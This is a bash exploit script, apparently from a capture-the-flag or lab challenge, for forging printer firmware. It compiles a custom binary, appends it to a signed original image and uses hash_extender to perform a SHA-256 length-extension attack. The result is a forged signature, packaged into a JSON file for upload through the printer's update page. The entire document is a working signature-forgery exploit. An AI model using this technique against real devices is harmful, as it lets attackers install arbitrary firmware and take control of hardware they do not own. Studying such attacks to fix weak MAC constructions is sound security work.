#!/bin/bash

# Build new 'firmware' image (new x86_64 binary), zip it up, then use hash_extender to append it to 
# the original firmware image and perform a hash extension attack to get a valid file signature.

# The signed firmware was then uploaded to the printer's firmware update page in the form of the firmware-export.json file

rm -f firmware.bin
rm -f append-firmware.bin
rm -f firmware-export.json

gcc new-firmware-bin.c -o firmware.bin
echo "[+] Compiled new-firmware-bin.c to firmware.bin..."

zip -q append-firmware.bin firmware.bin
echo "[+] Zipped firmware.bin to append-firmware.bin..."

hex_append_file=$(xxd -p append-firmware.bin | tr -d '\n')

output=$(./hash_extender -s 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 -l 16 -f sha256 --file=original-firmware.bin -a $hex_append_file --append-format=hex --out-data-format=hex)

signature=$(echo $output | awk '{print $8}')

echo $output | awk '{print $11}' | xxd -r -p > firmware.final

echo "[+] Wrote new firmware image to 'firmware.final'"

echo "[+] Signature:  $signature"

echo "{\"firmware\":\"$(base64 -w0 firmware.final)\",\"signature\":\"$signature\",\"secret_length\":16,\"algorithm\":\"SHA256\"}" > firmware-export.json

echo -e "[+] Wrote firmware-export.json:\n"
cat firmware-export.json

